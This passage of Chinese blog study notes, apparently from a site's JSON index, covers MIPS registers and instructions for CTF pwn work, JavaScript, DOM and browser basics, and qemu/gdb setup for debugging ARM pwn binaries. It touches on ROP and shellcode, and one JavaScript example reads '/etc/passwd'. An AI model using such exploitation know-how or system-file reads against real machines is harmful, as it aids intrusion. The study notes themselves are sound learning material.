Zero(结果为0)\n\n　　C\tSet when the operation result in a Carry(发生进位，或借位)\n\n　　V\tSet when the operation caused oVerflow(操作造成溢出)\n\n　　Q\tARM architecture v5E only sticky flag\n\n还有BEQ、BNE\n\n\n\n\n\n# 三、MIPS\n\n主要介绍mipsel架构的，小端序，大端的mips很少考到，而且也基本都是大同小异\n\n## 1.寄存器关系\n\n| REGISTER | NAME      | USAGE                                                        |\n| :------- | :-------- | :----------------------------------------------------------- |\n| $0       | $zero     | 常量0(constant value 0)                                      |\n| $1       | $at       | 保留给汇编器(Reserved for assembler)                         |\n| $2-$3    | $v0 - $v1 | 函数调用返回值(values for results and expression evaluation) |\n| $4-$7    | $a0-$a3   | 函数调用参数(arguments)                                      |\n| $8-$15   | $t0-$t7   | 暂时的(或随便用的)                                           |\n| $16-$23  | $s0-$s7   | 保存的(或如果用，需要SAVE/RESTORE的)(saved)                  |\n| $24-$25  | $t8-$t9   | 暂时的(或随便用的)                                           |\n| $28      | $gp       | 全局指针(Global Pointer)                                     |\n| $29      | $sp       | 堆栈指针(Stack Pointer)                                      |\n| $30      | $fp       | 帧指针(Frame Pointer)                                        |\n\n说明\n\n- $0\n\n即$zero,该寄存器总是返回零，为0这个有用常数提供了一个简洁的编码形式。\n\n```mipsasm\nmove $t0,$t1\n#实际为  \nadd $t0,$0,$t1\n```\n\n使用伪指令可以简化任务，汇编程序提供了比硬件更丰富的指令集。\n\n- $1\n\n即 $at，该寄存器为汇编保留，由于I型指令的立即数字段只有16位，在加载大常数时，编译器或汇编程序需要把大常数拆开，然后重新组合到寄存器里。比如加载一个32位立即数需要 `lui`（装入高位立即数）和`addi`两条指令。像MIPS程序拆散和重装大常数由汇编程序来完成，汇编程序必需一个临时寄存器来重组大常数，这也是为汇编保留$at的原因之一。\n\n- $2..$3:($v0-$v1)\n\n用于子程序的非浮点结果或返回值，对于子程序如何传递参数及如何返回，MIPS范围有一套约定，堆栈中少数几个位置处的内容装入CPU寄存器，其相应内存位置保留未做定义，当这两个寄存器不够存放返回值时，编译器通过内存来完成。\n\n- $4..$7:($a0-$a3)\n\n用来传递前四个参数给子程序，不够的用堆栈。a0-a3和v0-v1以及ra一起来支持子程序／过程调用，分别用以传递参数，返回结果和存放返回地址。当需要使用更多的寄存器时，就需要堆栈（stack)了,MIPS编译器总是为参数在堆栈中留有空间以防有参数需要存储。\n\n- $8..$15:($t0-$t7)\n\n临时寄存器，子程序可以使用它们而不用保留。\n\n- $16..$23:($s0-$s7)\n\n保存寄存器，在过程调用过程中需要保留（被调用者保存和恢复，还包括$fp和$ra），MIPS提供了临时寄存器和保存寄存器，这样就减少了寄存器溢出（spilling,即将不常用的变量放到存储器的过程),编译器在编译一个叶（leaf)过程（不调用其它过程的过程）的时候，总是在临时寄存器分配完了才使用需要保存的寄存器。\n\n- $24..$25:($t8-$t9)\n\n同($t0-$t7) $26..$27:($k0,$k1)为操作系统／异常处理保留，至少要预留一个。 异常（或中断）是一种不需要在程序中显示调用的过程。MIPS有个叫异常程序计数器（exception program counter,EPC)的寄存器，属于CP0寄存器，用于保存造成异常的那条指令的地址。查看控制寄存器的唯一方法是把它复制到通用寄存器里，指令`mfc0`(move from system control)可以将EPC中的地址复制到某个通用寄存器中，通过跳转语句（`jr`)，程序可以返回到造成异常的那条指令处继续执行。MIPS程序员都必须保留两个寄存器$k0和$k1，供操作系统使用。\n发生异常时，这两个寄存器的值不会被恢复，编译器也不使用k0和k1,异常处理函数可以将返回地址放到这两个中的任何一个，然后使用jr跳转到造成异常的指令处继续执行。\n\n- $28:($gp)\n\n为了简化静态数据的访问，MIPS软件保留了一个寄存器：全局指针gp(global pointer,$gp)，全局指针指向静态数据区中的运行时决定的地址，在存取位于gp值上下32KB范围内的数据时，只需要一条以gp为基指针的指令即可。在编译时，数据须在以gp为基指针的64KB范围内。\n\n- $29:($sp)\n\nMIPS硬件并不直接支持堆栈，你可以把它用于别的目的，但为了使用别人的程序或让别人使用你的程序，还是要遵守这个约定的，但这和硬件没有关系。\n\n- $30:($fp)\n\nGNU MIPS C编译器使用了帧指针(frame pointer),而SGI的C编译器没有使用，而把这个寄存器当作保存寄存器使用（$s8),这节省了调用和返回开销，但增加了代码生成的复杂性。\n\n- $31:($ra)\n\n存放返回地址，MIPS有个`jal`(jump-and-link,跳转并 链接)指令，在跳转到某个地址时，把下一条指令的地址放到$ra中。用于支持子程序，例如调用程序把参数放到$a0~$a3,然后`jal X`跳到X过程，被调过程完成后把结果放到$v0,$v1,然后使用`jr $ra`返回。\n\n\n\n## 2.汇编指令\n\n### (1)不同类型的指令\n\n#### R型指令：操作寄存器\n\n常见指令：`add`, `sub`, `and`, `or`, `nor`, `slt`, `sll`, `srl`, `jr`\n\n![image-20211230150231733](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20211230150231733.png)\n\n- opcod：操作码 \n- rs：源寄存器的数量 \n- rt：源寄存器的数量 \n- rd：目标寄存器的编号\n- sham：移位量（操作移位的位数）\n- Func: 函数（操作码扩展） \n\nSham仅用于操作偏移量的指令（例如`stl`）\n\n#### I型指令：操作常量\n\n常见指令：`addi`, `lw`, `sw`, `lh`, `sh`, `lb`, `lbu`, `sb`, `ll`, `sc`, `lui`, `andi`, `ori`, `beq`, `bne`, `slti`, `sltiu`\n\n- opcod：操作码\n- rs：源寄存器的数量\n- rd：源或目标寄存器的数量\n- imd: 立即值\n\n\n\n#### J型指令：跳跃寻址\n\n处理器直接跳跃到给定的地址，执行所在地址的指令\n\n常见指令：`j`, `jal`\n\n![image-20211230150255746](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20211230150255746.png)\n\n- Opcod：操作码\n- Imd：立即值\n\n\n\n### (2)常用指令\n\n其中`i`表示立即数相关，`u`表示无符号相关。\n\n#### ①load/store 指令\n\n##### la\n\n将地址或者标签存入一个寄存器 eg:`la $t0,val_1`复制val_l的地址到$t0中，val_1是一个Label\n\n##### li\n\n将立即数存入通用寄存器 eg:`li $t1, 40` $t1 = 40\n\n##### lw\n\n从指定的地址加载一个word类型的值到一个寄存器 eg:`lw $s0, 0($sp) $s0=MEM[$sp+0]`\n\n##### sw\n\n将寄存器的值，存于指定的地址word类型 eg:`sw $a0, 0($sp) MEM[$sp+0] = $a0`\n\n##### move\n\n寄存器传值 eg：`move $t5, $t2 $t5 = $t2`\n\n#### ②算数指令\n\n算数指令的所有操作都是寄存器，不能是 RAM 地址或间接寻址。且操作数大小都是 word（4byte）\n\n```asm\nadd $t0, $t1, $t2;\t\t$t0=$t1+$t2;\t带符号数相加\nsub $t0, $t1, $t2;\t\t$t0=$t1-$t2;\t带符号数相减\naddi $t0, $t1, 5;\t\t$t0=$t1+5;\t\t有立即数的加法\naddu $t0, $t1, $t2;\t\t$t0=$t1+$t2;\t无符号数的加法\nsubu $t0, $t1, $t2;\t\t$t0=$t1-$t2;\t带符号数相减\nmult $t3, $t3;\t\t\t(HI, LO) = $t3 * $t4\ndiv $t5, $t6;\t\t\t$Hi=$t5 mod $t6\nmfhi $t0;\t\t\t\t$t0 = $Hi\nmflo $t1;\t\t\t\t$t1 = $Lo\n```\n\n#### ③syscall\n\n产生一个软化中断，实现系统调用；系统调用号存放在 $v0 中，参数在 $a0~$a3 中；\n\n返回值在 $v0 中，如果出错，在 $a3 中返回错误号；在编写 shellcode 时，用到该指令机制\n\nWrite(1, “ABCn”, 5) 实现如下\n\n```asm\naddiu $sp, $sp, -32;\nli $a0, 1;\nlui $t6, 0x4142;\nori $t6, $t6, 0x430a;\nsw  $t6, $0($sp);\naddiu $a1, $sp, 0;\nli $a2, 5;\nli $v0, 4004;\nsyscall;\n```\n\n#### ④分支跳转指令\n\n分支跳转指令本身可以通过比较两个寄存器决定如何跳转；如果想要实现与立即数的比较跳转，需要结合类跳转指令实现\n\n```asm\nb target;\t\t\t\t无条件跳转到target处\nbeq $t0, $t1, target;\t如果\"$t0 == $t1”，跳转到target\nblt $t0, $t1, target;\t如果“$t0 < $t1”，跳转到target\nble $t0, $t1, target;\t如果“$t0 <= $t1” 跳转到target\nbgt;\nblt;\nbne;\t\t\t\t\t类比上\n```\n\n#### ⑤跳转指令\n\n```asm\nj target;\t\t\t无条件跳转target\njr $t3;\t\t\t\t跳转到$t3指向的地址处(Jump Register)\njal target;\t\t\t跳转到target，并保存返回地址到$ra中\n```\n\n#### ⑥子函数的调用\n\n```asm\njal   sub_routine_label;复制当前PC的值到$ra中，（当前PC值就是返回地址）程序跳转到sub_routine_label\n```\n\n#### ⑦子函数的返回\n\n```asm\njr    $ra;如果子函数重复嵌套，则将$ra的值保存在堆栈中，因为$ra总是保存当前执行的子函数的返回地址\n```\n\n\n\n以上大多参考如下\n\n[MIPS汇编语言入门 - Sylvain's Blog (valeeraz.github.io)](https://valeeraz.github.io/2020/05/08/architecture-mips/)\n\n[2021第四届强网拟态防御积分赛工控pwn eserver WP - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/259594)\n\n\n\n## 3.流水线特点\n\n以下指令的，strchr 函数的参数来自 $s0 而不是 $s2\n\n```asm\nmov $a0, $s2;\njalr strchr;\nmove $a0, $s0;\n```\n\n## 🔺注：流水线\n\n即跳转之前会先一步加载下一条指令，所以在寻找ROP时，注意看下一步指令都是什么，不然跳转过去参数或者栈帧都有可能会出错的。\n\n但是因为通常PWN题的MIPS通常是用qemu的user模式运行的，这个可能导致指令流水有时候表现不出来，所以不没有调用函数sleep(1)去将数据区刷新到指令区域也是可以拿到shell的；但是如果题目使用system模式部署，添加调用函数刷新数据区域再跳转到shellcode就很必要了，但如果是ROP来getshell倒是不用刷新数据。\n\n","tags":["汇编"],"categories":["汇编","汇编"]},{"title":"WEB技术与应用课程","url":"/2021/11/02/Web技术与应用/","content":"\n# Web技术与应用课程\n\n# 一、Java Script:\n\n## 1.引入script代码：\n\n```html\n<script>\n\t<!---javascript 代码--->\n</script>\n```\n\n\n\n## 2.引入外部script代码\n\n```html\n<script src = \"externalJS.js\">\n</script>\n```\n\n\n\n## 3.定义变量：\n\n### (1)赋值定义：\n\n```javascript\nvar i = 123;\nvar str = \"Hello\";\nvar str1 = 'abc';\nvar phr = \\`abc\\${str}`;//(使用这种类型插入其他的字符)\n```\n\n\n\n### (2)未赋值，初始化类型\n\n```js\nvar i;\ntypeof i = 'undefined';//(这种类型被判定为False)\n```\n\n▲javaScript的浮点数操作不一定准确：\n\n0.1+0.2 = 0.300000.....04\n\n通常使用(0.1x10+0.2x10)/10的形式\n\n在其他语言中也通常存在的\n\n### (3)特殊类型\n\nnull和undefined的值相等，但是类型不一样，null的类型是object\n\n\n\n## 4.定义函数\n\n### (1)初始定义\n\nfunction function_name(){ ....... }\n\n没有定义返回值的函数也会返回Undefined的类型。\n\n### (2)传参定义\n\n①定义function func(){...}\n\n仍然可以调用func(a,b,c)这种类型，传入的参数a,b,c被存放在arguments这个数组中，全局的数组。\n\n②定义function func(x){ return x}\n\n可以调用func()，不传参，如果返回的是undefined类型的\n\n### (3)定义的hoisted\n\n即函数可以定义在使用之后，应该是编译的时候进行了提升操作\n\n变量也具有这个效果，比如在同一个函数下的所有变量的作用域都是这个函数，但是其值并没有得到提升。\n\n\n\n函数变量的toString就是函数的定义表达式\n\n### (4)strict模式\n\n当函数定义中，加入了\"use strict\"时，会对变量的声明有更严格的要求，不能简单地直接赋值。\n\n### (5)non-hoisting模式\n\n\n\n### (6)Let关键字\n\n```js\nvar x = 10\n\n{let x = 2}\n```\n\nlet使得x只在{...}这个声明块中有效，外面的语句中x的值为10。\n\n\n\n## 5.定义对象\n\n### (1)初始赋值\n\n```js\nlet user = {name:\"Alice\",age:23,country:\"China\"};\nvar d = new Date();//(日期对象)\n```\n\n### (2)增加属性\n\n```js\nuser.fan = \"Banana\";\n```\n\n### (3)删除属性\n\n```js\ndelete user.name;\n```\n\n\n\n### (4)遍历对象\n\n```js\nObject.keys(user);\nObject.values(user);\n```\n\n获取变量的key和values的相关数据\n\n\n\n## 6.定义数组(类型为object)\n\n### (1)初始定义\n\n```js\nvar anArr = [1,2,3];\n```\n\n### (2)相关操作\n\n```js\nanArr[5] = \"FooBar\";//(这个也是可以的)\nanArr.length;//返回值为6\nanArr.sort();//排序相关\n```\n\n### (3)数据结构相关操作\n\n#### ①尾部操作\n\n```js\nanArr.push();\nanArr.pop();\n```\n\n#### ②首部操作\n\n```js\nanArr.shift();\nanArr.unshift();\n```\n\n### (4)filter方法\n\n创建新数组检测原数组\n\n```javascript\nvar ages = [33,32,16,40];\nfunction checkAdult(age){\n    return age >= 18;\n}\nconsole.log(ages.filter(checkAdult));\nconsole.log(ages.filter(function(value){\n    return value >= 18;\n}))\n```\n\n\n\n## 7.正则表达式\n\n### (1)定义正则表达式\n\n```js\nvar re = /ab+c/;//(使用两个/来定义正则)\nvar re2 = new RgeExp(\"ab+c\");//(使用对象来定义正则)\n```\n\n### (2)调用正则\n\n#### ①字符串形式\n\n```js\n\"XXXXXXX abbbbc\".search(/ab+c);\n```\n\n返回值为查找到的索引，没找到则返回-1\n\n#### ②对象调用\n\n```js\nvar re = /ab+c/;\nre.exec(str);//返回re这个表示式的执行结果，返回包含结果的一个数组\n```\n\n### (3)模式\n\n`...`表任意字符\n\n`+`至少一个\n\n`*`0个或多个\n\n`?`0个或多个\n\n`\\d`找一个数字 **(digtal)**\n\n`\\s`找一个空格 **(space)**\n\n`\\b`找一个单词的开始或结尾\n\n`g`全局模式，在表达式末尾加上g代表全局，返回所有查找到的\n\n比如匹配abbbc即可用`ab+c`\n\n`var re3 = /[^\\d]/;`表查找不是数字的\n\n\n\n## 8.异常处理\n\n```javascript\ntry{\n\tBlock of code....\n    throw \"Help!\";\n}catch(err){\n\tconsole.log(\"Error call\");\n}finally{\n    will be exec whatever there are some error....\n}\n```\n\n\n\n## 9.Debug\n\n在chrome中可以调试，即浏览器\n\n\n\n## 10.新的特性\n\n### (1)Modules\n\n```javascript\n//profile.js\nvar a = \"aa\";\nvar b = \"bb\";\nexport {a,b};\n\n//main.js\nimport {a,b} from './profile.js';\nfunction setName(element) {\n  element.textContent = a + ' ' + b;\n} \n```\n\n\n\n### (2)Default para\n\n```javascript\nfunction myFunc(a=1,b=\"Hello\"){\n\n}\n```\n\ndigtal + undefined = NaN\n\n### (3)Rest para\n\n```javascript\n//the ArgsArray放置的是多余的参数\nfunction myFunc(a,b,... the_ArgsArray){\n\tvar c=the_ArgsArray[0];\n}\n\n\nfunction add(...values) {\n    let sum = 0;\n    for (var i=0;i<values.length;i++) {\n        sum += values[i];\n    }\n    return sum;\n}\n//2,5,3被放置在values数组中\nadd(2, 5, 3) //返回10\n```\n\n### (4)spread operator\n\n```javascript\nvar anArray=[1,2,3];\nmyFunc(...anArray);//将数组anArray的每个元素作为函数参数传给myFunc函数\nvar o=[5,...anArray,6];\n```\n\n### (5)模板类字符串string\n\n```javascript\nfunction formatGreetings(name,age){\n    var str=\n        `Hi ${name}  your age is  ${age}`;\n}//新特性字符串的拼接\n```\n\n### (6)遍历\n\n```javascript\nlet sum=0;\nfor(ent of a){\n    sum+=ent;\n}\n```\n\n\n\n## 11.类和对象\n\n### (1)声明和添加\n\n```javascript\nlet o = {oldProp:'old'};\no.aMethod = function(){\n\tthis.newProp = 'new';\n\treturn Object.keys(this);\n}\no.aMethod();\n//o的成员即为[oldProp,newProp,aMethod]\n```\n\n### (2)函数即为对象\n\n```javascript\nfunction func(value){\n\tconsole.log(this,arg);\n}\nfunc.toString();\nfunc.call({t:1},2);\n//call使得func这个对象就会变成{t:1}\nlet newFunc = func.bind({z:2},3);\n//bind会返回一个新的对象为{z:2}\n//所有对象都有toString,call,bind等方法\n```\n\n### (3)定义类和实例化\n\n```javascript\nfunction Rectangle(width,height){\n\tthis.width = width;\n\tthis.height = height;\n\tthis.area = function(){\n\t\treturn this.width*this.height;\n\t}\n}\nvar obj = new Rectangle(26,14);\n\n//查看objd的构造方法是不是'Rectangle'\nobj.constructor.name == 'Rectangle'\n\n//给Obj增加属性description\nobj.description = 'big Rectangle';\n\nvar obj2 = new Rectangle(2,3);\nobj2.tell = function(){\n    alert(width+\";\"+height);\n}\n//以上方法增加的属性在对象里，不在类里\n\nconsole.log(obj);\nconsole.log(obj2);\n```\n\n### (4)为类增加属性方法\n\n```javascript\nfunction Rectangle(width,height){\n\tthis.width = width;\n\tthis.height = height;\n}\n\n//使用prototype给Rectangle这个类增加成员\nRectangle.prototype.area = function(){\n\treturn this.width*this,height;\n};\nRectangle.prototype.description = 'Hello!';\n//这种方法相当于修改类的定义，所有的实例化对象都会被修改掉\n```\n\n### (5)新版的类\n\n```javascript\nclass shape(){\n\tconstructor(str){this.str = str};\n}\nclass Rectangle extends shape = ...\n```\n\n## 12.函数式编程\n\n### (1)处理字符串\n\n```javascript\nvar anArr = [45,4,9,16,25];\nfunction filterFunc(value){\n\treturn value<45;\n}\nfunction mapFunc(value,idx){\n\treturn value*idx;\n}\nfunction reduceFunc(total,value){\n    return total+value\n}\nanArr.filter(filterFunc).map(mapFunc).reduce(reduceFunc)\n```\n\n\n\n### (2)回调函数\n\n主要用来跟踪异步的函数调用行为，确保正常异步加载结束\n\n```html\n<body>\n<script>\n    //可以异步调用该函数,使得该函数后面的其他脚本也同时运行\n    function loadScript(src){\n        let script = document.createElement('script');\n        scripte.src = src;\n        document.head.append(script);\n    }\n    loadScript('./myScript.js');\n    newFunction();\n    //当newFunction()在myScript.js中时，如果myScript.js没有加载完，则直接调用\n    //newFunction会出错，因为没有加载上\n    \n    \n    //使用回调函数确保脚本加载完成再调用其中的函数 \n    function callbackFunc(){\n        newFunction();\n    }\n    function loadScript(src,callback){\n        let script = document.createElement('script');\n        scripte.src = src;\n        script.onload = () => callback(script);\n        document.head.append(script);\n    }\n    loadScript('./myScript.js');\n    //这样在loadScript函数执行完成之后才会执行callbackFunc从而调用newFunction\n    \n\t//3*1000毫秒后执行callbackFunc\n    setTimeout(callbackFunc,3*1000)\n    \n    //读完文件之后再调用callbackFunc\n    function callbackFunc(err,data){\n        console.log(String(data));\n    }\n    fs.readFile('/etc/passwd',callbackFunc);\n    \n</script>\n</body>\n```\n\n#### ▲注\n\n方法：代表对象里面的函数\n\n函数：对象外部的函数\n\n### (3)闭包\n\n即在调用函数对象内部的函数，该函数修改函数对象内的成员，该成员可以得到修改使用，就类似于java中的接口设置。\n\n```javascript\nvar myObj = (function() {\n    var privateProp1 = 1; \n    var privateProp2 = \"test\";\n    var setPrivate1 = function(val1) { privateProp1 = val1; }\n    var compute = function() {return privateProp1 + privateProp2;}\n    return {compute: compute, setPrivate1: setPrivate1};\n})();\n//即可以通过接口函数setPrivate1和compute来访问其privateProp1和privateProp2\n```\n\n## 13.类型判断\n\n`==`：只判断值，false和false比较都为true...\n\n`===`：判断类型和值\n\n\n\n## 14.Promise替代回调函数\n\n将执行结果保存，然后利用函数处理\n\n```javascript\n//等待1秒后执行resolve，将结果给到promise.result中\nlet promise = new Promise(function(resolve, reject) {\n    setTimeout(() => resolve(\"done!\"), 1000);\n});\n\n\n//一般用来处理promise的执行结果\npromise.then(\n    result => alert(result), // shows \"done!\" after 1 second\n    error => alert(error) // doesn't run\n);\n\n//catch只处理错误结果\npromise.catch(error);\n```\n\n加载脚本的处理\n\n```javascript\nfunction loadScript(src) {\n    return new Promise(function(resolve, reject) {\n        let script = document.createElement('script');\n        script.src = src;\n        script.onload = () => resolve(script);\n        script.onerror = () => reject(new Error(`Script load error for ${src}`));\n        document.head.append(script);\n    });\n}\nloadScript(src).then(func...);\n```\n\n## 15.async/await语法\n\nasync异步执行\n\ndefer标志后浏览器完全解析完才会执行script代码\n\n经常加入 async和defer来使得异步加载dom树，从外部引入javascript代码\n\n\n\n\n\n# 二、JSON\n\nJSON即JavaScript对象数据的存储形式，也用来发送数据\n\n## 1.基本语法\n\n### (1)转换\n\n#### ①对象转JSON字符串\n\n```js\nvar myJSON = JSON.stringify(obj);\ntypeof myJSON = 'string';\n```\n\n#### ②JSON字符串转对象\n\n```js\nvar s='{ \"name\":\"John\", \"age\":30, \"city\":\"New York\"}';\nvar myobj=JSON.parse(s);\ntypeof myobj=='object';\n```\n\n\n\n# 三、DOM树\n\n文档对象模型\n\n以文件夹树的形式进行存储，依据文档生成DOM树\n\n```html\n<html>\n    <head>\n        <title> My title </title>\n    </head>\n    <body>\n        <a href=\"a.html\" > My link </a>\n       <h1> My header </h1>\n    </body>\n</html>\n```\n\n以上代码即可形成以下的DOM树\n\n![image-20211125115502855](C:/Users/007/AppData/Roaming/Typora/typora-user-images/image-20211125115502855.png)\n\n通常进行结点修改信息\n\n## 1.基本语法\n\n### (1)获取属性\n\n#### ①通过body\n\n```\nelement = document.body.firstChild.nextSibling.firstChild;\n```\n\n比如以下结构\n\n```html\n<html>\n<body>\n Test\n\n  <div>Users:</div>\n  <ul>\n    <li>John</li>\n    <li>Pete</li>\n  </ul>\n\n  Final\n</body>\n</html>\n```\n\n寻址div结点\n\n```javascript\ndivNote = document.body.firstChild.nextSibling\n```\n\n#### ②通过ID\n\n```html\n<p>Sample<b id=\"mb\">bold</b>display</p>\n```\n\n以上形式的b结点可通过其ID查找\n\n```javascript\nbNote = document.getElementById('mb')\n```\n\n#### ③其他查找形式\n\n以下方法均返回一个数组\n\n##### A.tagName\n\n```html\n<body>\n    <p>Hello</p>\n    <p>Hello P</p>\n    <p>Hello DOM</p>\n</body>\n```\n\n查找：\n\n```javascript\nvar tagPArr = document.getElementsByTagName(\"p\")//得到三个结点标签p的数组tagPArr\n```\n\n##### B.className\n\n```html\n<div class=\"example\">\n    A div element with class=\"example\"\n</div>\n<div class=\"example\">\n    Another div element with class=\"example\"\n</div>\n<p class=\"example\">A p element with \n    class=\"example\"</p>\n```\n\n查找：\n\n```javascript\nvar classExampleArr = document.getElementsByClassName(\"example\")\n//得到三个结点class为example的数组\n```\n\n##### C.选择符查找\n\n获取所有标签为\"p\"的结点，返回得到一个数组\n\n```javascript\nvar myNodelist = document.querySelectorAll(\"p\");\n```\n\n\n\n\n\n### (2)设置属性\n\n#### ①常规修改\n\n```html\n<script>\n    var op=document.getElementById(\"mp\");\n    console.log(op.textContent);//Samplebolddisplay\n    console.log(op.innertHTML);//Sample<b>bold</b>display\n    console.log(op.outerHTML);\n    //<p id=\"mp\">Sample<b>bold</b>display</p>\n    op.setAttribute(\"class\",\"cp\");\n    op.className = \"active\";\n    //css结构属性修改\n    op.style.//....\n</script>\n```\n\n\n\n### (3)插入新结点\n\n```javascript\n//先生成标签为P的结点\npara = document.creatElement(\"P\");\n//生成文本字符为My Text的结点\nnode = document.creatTextNode(\"My Text\");\n//将文本结点放到para里，形成 <p>My Text</p>  这样的结点\npara.appendChild(node);\n```\n\n\n\n### (4)布局属性\n\n得到元素在当前页面中的坐标\n\n![image-20211130111349453](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211130111349.png)\n\n#### ①获取布局信息\n\n`position:`\n\n`relative`即代表设置为可定位的\n\n`absolute`代表以最近设置过postion的元素为基准，往上层找元素\n\n不设置postion状态则依次排列\n\n```javascript\n//元素需要先是定位过的，即position属性被设置\n//如果没有定位，则默认offsetParent为body元素\nvar ofH = element.offsetHeight;\n```\n\n#### ②设置布局信息\n\n```javascript\nelement.style.position = \"absolute\";\nelement.style.left = \"40px\";\n```\n\n\n\n### (5)事件处理\n\n#### ①添加事件处理\n\n##### A.直接定义\n\n```html\n<div onclick=\"gotMouseClick('id42');\">...</div>\n\n//直接处理语句为\"this.innerHTML = 'Ooops!'\"\n<h1 onclick=\"this.innerHTML = 'Ooops!'\"> </h1>\n\n\n<!--HTML中直接定义函数处理-->\n<h1 onclick=\"changeText(this)\"> </h1>\n<script>\nfunction changeText(id) { \n  id.innerHTML = \"Ooops!\";\n}\n</script>\n```\n\n##### B.DOM定义\n\n```javascript\n//获取元素之后添加对应的处理事件\nelement.onclick = mouseClick;\n\n//或者\nelement.addEventListener(\"click\", mouseClick);\nelement.removeEventListener.....\n```\n\n#### ②获取事件相关信息\n\n```javascript\n//在事件函数中的处理,event即为当前事件的对象\nconsole.log(event.timeStamp);\n```\n\n#### ③多事件处理相应顺序\n\n##### A.冒泡处理方式 Bubbling\n\n```html\n<form onclick=\"alert('form')\">FORM\n  <div onclick=\"alert('div')\">DIV\n    <p onclick=\"alert('p')\">P</p>\n  </div>\n</form>\n```\n\n从里向外处理，即p->div->form顺序处理相应事件\n\n##### B.停止冒泡处理\n\n到form处理时停止传播\n\n```html\n<form \nonclick=\"event.stopPropagation()\">FORM\n  <div onclick=\"alert('div')\">DIV\n    <p onclick=\"alert('p')\">P</p>\n  </div>\n</form>\n```\n\n##### C.从外层向内处理 Capture\n\n每个标签均添加鼠标点击处理事件，alert()函数的捕获状态为true和false\n\n`true`:设置捕获状态为true，使其处理**从外向内**处理\n\n`fasle`:设置捕获状态为false，使其处理**从内向外**处理\n\n```html\n<style>\n    body * {\n        margin: 10px;\n        border: 1px solid blue;\n    }\n</style>\n<form>FORM\n    <div>DIV\n        <p>P</p>\n    </div>\n</form>\n<script>\n    for(let elem of document.querySelectorAll('*')) {\n        elem.addEventListener(\"click\",\n            e => alert(`Capturing: ${elem.tagName}`), true);\n    }\n</script>\n```\n\n停止处理也是一样的，添加stopPropagation事件\n\n🔺W3C形式为先Capture再Bubbling的综合形式\n\n#### ④事件的目标\n\n\n\n#### ⑤时间相关的事件\n\n```js\nsetTimeout(func,50);\ntoken = setInterval(func,50);\nclearInterval(token);\n```\n\n#### ⑥事件的线程\n\n单线程处理事件，不会同时执行多个事件。若存在回调函数时，也是顺序进行处理的，顺序可能会不太一样。\n\n\n\n\n\n# 四、BOM树\n\n浏览器中的对象树\n\n`navigator`  `screen`  `location`  `history`\n\n## 1.基本语法\n\n### (1)常见对象\n\n```js\n//location即当前页面的html文件指针\nwindow.location.href = \"newPage.html\";\n\n//history保存用户访问过的页面，以下为执行回退上一个页面指令\nwindow.history.go(-1);\nhistory.go(-3); // Go back three pages\nhistory.go(3); // Go forward three pages \nhistory.back(); // Same as history.go(-1) \nhistory.forward();// Same as history.go(1)\n```\n\n![image-20211130111020329](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211229145548.png)\n\n\n\n## ▲注：dom和script顺序生成问题\n\nrender tree是渲染的\n\nscript会影响dom树的构建，html中在script之后的dom树结构不会在script中存在。\n\n\n\n\n\n# 五、多代Web技术\n\n## 1.无状态\n\n即不保存用户信息\n\n## 2.第一代\n\nPHP,ASP,.net等应用\n\n## 3.第二代\n\nRuby on Rails,Django等\n\n创建model-view-controllers , Templates等\n\n#### Model:\n\n大多是Java Script的对象\n\n#### View:\n\nHTML/CSS等\n\n最终呈现给用户的Web框架，HTML加上其他的一些代码\n\n#### Controller:\n\n按钮控建等\n\n在服务器中获取model进行处理，将页面呈现出来，常见的Java Script的执行代码\n\n## 4.第三代\n\nAngular JS\n\n更加类似app。\n\n## 5.第四代\n\n通过虚拟的DOM树来形成页面\n\n\n\n\n\n# React小项目：\n\n[I Love You ❤️ (pig-007.github.io)](https://pig-007.github.io/xx520/)\n","tags":["WEB技术"],"categories":["WEB","技术应用"]},{"title":"Arm从0开始","url":"/2021/11/02/异构从0开始/","content":"\n\n\n# 前言\n\n记录一下异构的PWN题\n\n🔺qemu 的 user 模式下，所以即便程序重启 libc 地址也不变，但是system模式，即加了内核的情况下就会改变了。\n\n# 一、调试问题\n\n## 1.ARM架构\n\n`pwndbg`对arm架构的支持还是挺好的\n\n### (1)无PIE\n\n没有PIE的时候，直接使用patchelf将其链接器和搜索路径改一下即可\n\n```bash\npatchelf --set-rpath /home/hacker/glibc/2.23/arm/ --set-interpreter /home/hacker/glibc/2.23/arm/lib/ld-linux.so.3 ./armNote\n```\n\n然后通过qemu加载运行库启动\n\n```bash\nqemu-arm -L /home/hacker/glibc/2.23/arm/ -g 12345 ./armNote\n```\n\n之后通过gdb-multiarch连接上即可\n\n```bash\ngdb-multiarch -q armNote\ntarget remote: 12345\n```\n\n这样就能调试了，包括pwndbg中的堆块heap，bins命令等也可以使用。\n\n![image-20211121161707292](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121161707.png)\n\n![image-20211121161725233](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121161725.png)\n\n### (2)有PIE\n\n这个就比较复杂了，首先还是改掉用链接器和搜索路径，之后运行起来，查看vmmap\n\n![image-20211121162647509](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121162647.png)\n\n这里在stack的末尾，即图中蓝色框起来的就是elf基地址，我也不知道为什么，反正调试就是这样的，可能是QEMU和PIE的相关机制问题把。\n\n之后通过elfBase来断点，再通过got表即可找到libc基地址了。\n\n![image-20211121163058346](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121163058.png)\n\n![image-20211121163230165](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121163230.png)\n\n之后再通过`add-symbol-file`即可得到地址了，地址由于qemu的关系，一直是不变的。\n\n但是这里如果直接打印地址会出错，原因未知，需要重载符号表\n\n![image-20211121163909059](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121163909.png)\n\n![image-20211121164400425](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121164400.png)\n\n重载符号表如下\n\n![image-20211121164500582](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121164500.png)\n\n可以看到之后就正确了。\n\n不过还是没有办法进行bins，heap之类的命令。这个命令是pwndbg从`__libc_malloc_initialized`这个全局符号获取的，但是添加了符号表之后这个全局符号还是没有被重新加载\n\n![image-20211121165405192](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121165405.png)\n\n导致无法识别，所以也就无法使用堆相关命令，不过可以从main_aren中简单看一下堆结构\n\n![image-20211121170328689](https://pig-007.o